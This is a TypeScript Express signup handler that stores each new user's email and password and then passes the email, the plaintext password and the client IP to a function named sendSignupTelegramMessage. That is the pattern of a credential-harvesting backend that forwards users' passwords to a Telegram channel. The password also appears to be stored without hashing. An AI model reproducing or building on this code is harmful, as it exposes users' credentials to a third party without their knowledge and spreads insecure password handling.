import { Request, Response } from 'express';
import { sendSignupTelegramMessage } from './telegram';
import { addUser } from '../models/user';

export const signup = async (req: Request, res: Response) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ message: 'Email and password are required.' });
    }
    addUser({ email, password });
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    try {
        await sendSignupTelegramMessage(email, password, ip as string);
        res.status(201).json({ message: 'Signup successful.' });
    } catch (err) {
        res.status(500).json({ message: 'Signup failed to send Telegram message.' });
    }
}; 